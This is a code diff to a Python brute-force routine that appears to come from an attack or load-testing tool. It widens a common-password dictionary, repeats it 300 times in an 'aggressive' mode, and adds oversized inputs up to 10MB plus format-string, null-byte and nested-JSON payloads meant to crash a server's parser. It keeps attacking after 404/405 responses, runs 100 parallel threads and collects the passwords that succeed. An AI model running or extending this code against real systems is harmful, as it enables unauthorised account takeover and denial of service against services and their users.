@@ -28,19 +28,42 @@ def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
         "sysadmin", "support", "service", "oracle", "apache",
         "tomcat", "postgres", "mysql", "java", "server",
         "abc12345", "test1234", "password01", "admin123", "secret",
-        "god", "jesus", "love", "angel", "beautiful"
+        "god", "jesus", "love", "angel", "beautiful", "princess",
+        "michael", "jordan", "football", "baseball", "soccer",
+        "access", "admin1", "administrator", "password2023", "password2024",
+        "changeme1", "changeme123", "welcome1", "welcome123",
+        "test01", "test02", "demo", "demo123", "operator",
+        "summer", "winter", "autumn", "spring", "march",
+        "april", "may", "june", "july", "august",
+        "september", "october", "november", "december",
+        "monday", "tuesday", "wednesday", "thursday", "friday",
+        "123qwe", "qwe123", "pass1234", "pass1", "a", "aa",
+        "111", "222", "333", "444", "555", "666", "777", "888", "999"
     ]
     
     # 2. Server Crash Payloads (Buffer Overflow / DoS) - User Request
     if scenario.config.get("aggressive"):
-        print("    [!!!] Adding SERVER CRASH Payloads to Brute Force dictionary...")
+        print("    [!!!] UNLEASHING EXTREME Brute Force & Buffer Overflow Payloads...")
+        # Expand common passwords list significantly for aggressive mode
         passwords.extend([
-            "A" * 5000, # Buffer Overflow Attempt (5KB)
-            "B" * 20000, # Buffer Overflow Attempt (20KB)
-            "'" * 500, # Quote Flooding (SQL/Parser Stress)
-            "%s" * 200, # Format String DoS
-            "\x00" * 500, # Null Byte Flood
-            "\n" * 500, # Newline Flood
+            "admin", "password", "123456", "admin123", "root", "toor", "user", "guest",
+            "qwerty", "password123", "12345678", "111111", "12345", "oracle", "mysql",
+            "postgres", "service", "support", "manager", "sysadmin", "login", "secret"
+        ] * 300) # Duplicate to increase volume (User Demand: K's of attacks)
+
+        # EXTREME BUFFER OVERFLOWS (Attempting to crash the parser)
+        passwords.extend([
+            "A" * 10000,    # 10KB
+            "B" * 50000,    # 50KB
+            "C" * 100000,   # 100KB
+            "D" * 500000,   # 500KB
+            "E" * 1000000,  # 1MB
+            "F" * 10000000, # 10MB (The "Parser execution" killer)
+            "'" * 1000,     # SQL Stress
+            "%s" * 1000,    # Format String
+            "\x00" * 1000,  # Null Byte
+            "\n" * 1000,    # Newline
+            "{'a':" * 500 + "1" + "}" * 500 # Nested JSON Depth Attack
         ])
     
     count = len(passwords)
@@ -49,7 +72,7 @@ def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
     check = client.send(scenario.method, scenario.target, json_body={"u": "test", "p": "test"})
     if check.status_code in [404, 405]:
         if scenario.config.get("aggressive"):
-             print(f"    [AGGRESSIVE] FORCE-ATTACK: Ignoring status {check.status_code} on {scenario.target}. Launching full dictionary attack.")
+             print(f"    [AGGRESSIVE] FORCE-ATTACK: Ignoring status {check.status_code} on {scenario.target}. Starting High-Pressure Brute Force.")
         else:
              return {
                 "scenario_id": scenario.id,
@@ -63,6 +86,8 @@ def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
     success_creds = []
     
     import concurrent.futures
+    import threading
+    lock = threading.Lock()
     
     def check_password(pwd):
         try:
@@ -70,28 +95,34 @@ def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
             resp = client.send(scenario.method, scenario.target, json_body=body)
             
             if resp.status_code != 0:
-                responses.append(resp.status_code)
+                with lock: responses.append(resp.status_code)
                 
-                # Check for Successful Login!
-                if resp.status_code == 200 and "token" in resp.text.lower():
-                    success_creds.append(pwd)
-                elif resp.status_code in [302, 301] and "login" not in resp.headers.get("Location", ""):
-                     success_creds.append(pwd)
+                # REFINED SUCCESS DETECTION
+                is_success = False
+                lower_text = resp.text.lower()
+                
+                if resp.status_code == 200:
+                    keywords = ["token", "success", "session", "auth", "profile", "user_id"]
+                    if any(k in lower_text for k in keywords):
+                        is_success = True
+                elif resp.status_code in [302, 301]:
+                     loc = resp.headers.get("Location", "").lower()
+                     if "login" not in loc and "auth" not in loc:
+                          is_success = True
+                
+                if is_success:
+                    with lock: success_creds.append(pwd)
         except Exception:
-            pass # Suppress thread errors to prevent engine crash
+            pass
                  
-    # Run in parallel
-    # REDUCED THREADS: Nested concurrency can choke the OS.
-    # Engine runs 5-10 threads. If each launches 20, we enter 200+ thread territory.
-    # Let's keep this sane.
-    max_workers = 5
+    # HIGH PRESSURE THREADS
+    max_workers = 100 if scenario.config.get("aggressive") else 20
     
     try:
         with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
-            # list() forces execution and catches 'map' exceptions if any propagate
             list(executor.map(check_password, passwords))
     except Exception as e:
-        print(f"    [!] Brute Force Partial Error: {e}")
+        print(f"    [!] Brute Force Engine Error: {e}")
 
     if success_creds:
          return {
